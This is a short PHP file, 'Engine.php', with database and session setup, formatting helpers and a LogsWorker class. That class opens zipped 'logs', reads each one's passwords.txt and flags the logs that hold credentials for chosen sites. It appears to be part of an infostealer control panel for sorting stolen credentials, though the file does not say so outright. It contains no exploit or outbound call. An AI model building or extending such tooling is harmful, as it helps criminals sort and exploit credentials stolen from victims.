<?php
// -------------------------------------------------------------------------
// Engine.php
// -------------------------------------------------------------------------



// -------------------------------------------------------------------------
// database 
$db = mysqli_connect($config["main"]["mysql_server"], $config["main"]["mysql_user"], $config["main"]["mysql_password"], $config["main"]["mysql_dbname"]);

if ($db->connect_errno)
{
	echo "connection to db error, abort";
	exit();
}
// -------------------------------------------------------------------------
// session 
session_start();

// -------------------------------------------------------------------------
// formatter 
function formatSizeUnits($bytes)
{
	if ($bytes >= 1073741824)
	{
		$bytes = number_format($bytes / 1073741824, 2) . ' Gb';
	}
	elseif ($bytes >= 1048576)
	{
		$bytes = number_format($bytes / 1048576, 2) . ' Mb';
	}
	elseif ($bytes >= 1024)
	{
		$bytes = number_format($bytes / 1024, 2) . ' Kb';
	}
	elseif ($bytes > 1)
	{
		$bytes = $bytes . ' b';
	}
	elseif ($bytes == 1)
	{
		$bytes = $bytes . ' b';
	}
	else
	{
		$bytes = '0 b';
	}
	
	return $bytes;
}

// -------------------------------------------------------------------------
	// calc support 
	function roundToTheNearestAnything($value, $roundTo)
	{
		$mod = $value%$roundTo;
		return $value+($mod<($roundTo/2)?-$mod:$roundTo-$mod);
	}
	
	// -------------------------------------------------------------------------
	// calc 
	function calculatePercent($one, $two, $rounded)
	{
		$result = ($two / $one) * 100;
		
		if($rounded)
		{
			return round($result, 2);
		}
		else
		{
			return round(roundToTheNearestAnything(round(roundToTheNearestAnything($result, 10)), 10));
		}
	}

// ---------------------------------------------------------------------------------------
// LogsWorker
//
// Functions for logs
// ---------------------------------------------------------------------------------------
class LogsWorker
{	
	// -------------------------------------------------------------------------
	// check preset in log
	function checkPreset($config, $log, $site, $color)
	{	
		$zip = new ZipArchive;
		$reading = "";
		
		if ($zip->open(realpath($config["main"]["LogsFolder"].'/'. $log["FileName"] .'')) === TRUE) 
		{
			$reading = $zip->getFromName("passwords.txt");
			$zip->close();
			
			$reading = nl2br($reading);
			$pos = stripos($reading, $site);
			
			if ($pos !== false)
			{
				echo '
				<div class="text-nowrap d-inline-block" style="margin-top: 6px;">
					<span style="color: #'. $color .'"><i class="fa fa-key"></i> '. $site .'</span>
				</div>
				';
			}
		}
	}
};


?>